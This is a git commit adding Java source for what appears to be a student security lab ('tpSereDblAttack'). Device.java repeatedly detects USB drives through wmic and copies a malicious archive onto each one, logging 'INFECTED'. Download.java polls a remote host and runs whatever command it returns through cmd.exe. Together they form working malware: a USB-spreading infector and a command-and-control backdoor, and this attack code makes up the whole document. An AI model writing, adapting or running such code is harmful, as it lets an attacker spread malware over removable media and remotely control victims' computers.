f31340d94c255ac53eceff9f0b253455560e81d4
etienne-politinsa <etienne.politinsa@gmail.com>
2019-03-24 23:19:28 +0100

    Add code

---
+++ Device.java
@@ -0,0 +1,73 @@
+package tpSereDblAttack;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.util.ArrayList;
+import java.util.List;
+
+public class Device implements Runnable {
+
+	int waitTime = 4; // en sec
+
+	public static void main(String args[]) {
+		new Thread(new Download("http://10.101.101.3", 5)).start();
+		//new Thread(new Download("https://api.ipify.org/?format=json", 5)).start();
+		new Thread(new Device()).start();
+	}
+
+	/**
+	 * Sleep for waitTime seconds then get USB device and infect them
+	 */
+	@Override
+	public void run() {
+		while(true) {
+			try {
+				Thread.sleep(waitTime * 1000);
+				List<String> devices = getDevices();
+				for (String d: devices)
+					infect(d);
+			} catch (InterruptedException e) {
+				e.printStackTrace();
+			}
+		}		
+	}
+	/**
+	 * @param device string identifying a device
+	 * Copy a malicious file to the device
+	 */
+	public void infect(String device) {
+		try {
+			String username = new BufferedReader(new InputStreamReader(
+					Runtime.getRuntime().exec("cmd.exe /c echo %username%").getInputStream()
+					)).readLine();
+			Runtime.getRuntime().exec("cmd.exe /c copy C:\\Users\\"+username+"\\Downloads\\test.rar " + device);
+			System.out.println("INFECTED : " + device);
+		} catch (Exception e) {e.printStackTrace();}
+	}
+
+	/**
+	 * Use windows wmic built-in to retrieve connected USB drives
+	 * @return List<String> of devices's identifiers
+	 */
+	public List<String> getDevices() {
+		List<String> lines = new ArrayList<>();
+
+		try {
+			BufferedReader r = new BufferedReader(new InputStreamReader(
+					Runtime.getRuntime()
+					.exec("cmd.exe /c wmic logicaldisk where drivetype=2 get deviceid")
+					//.exec("cmd.exe /c dir") // For DEBUG
+					.getInputStream()));
+			String line;
+			while ((line = r.readLine()) != null) {
+				// System.out.println(line); // For DEBUG
+				if (line.contains(":"))
+					lines.add(line);
+			}
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		return lines;
+	}
+}
+
---
+++ Download.java
@@ -0,0 +1,55 @@
+package tpSereDblAttack;
+
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.net.URL;
+
+public class Download implements Runnable {
+	private URL url;
+	private String command;
+	private int sec;
+
+	public Download(String s_url, int sec) {
+		try {
+			this.url = new URL(s_url);
+			this.sec = sec;
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+
+	private void updateCommand() {
+		try {
+			command = new BufferedReader(new InputStreamReader(url.openStream())).readLine();
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+		System.out.println(command);
+	}
+
+	public void execute() {
+		try {
+			Runtime.getRuntime().exec("cmd.exe /c " + command);
+		} catch (Exception e) {
+			e.printStackTrace();
+		}
+	}
+
+	@Override
+	public void run() {
+		String cmd = "";
+		while (true) {
+			this.updateCommand();
+			if(!command.equals(cmd)) {
+				cmd = command;
+				this.execute();
+			}
+			try {
+				Thread.sleep(sec * 1000);
+			} catch (InterruptedException e) {
+				e.printStackTrace();
+			}
+		}
+	}
+}
+
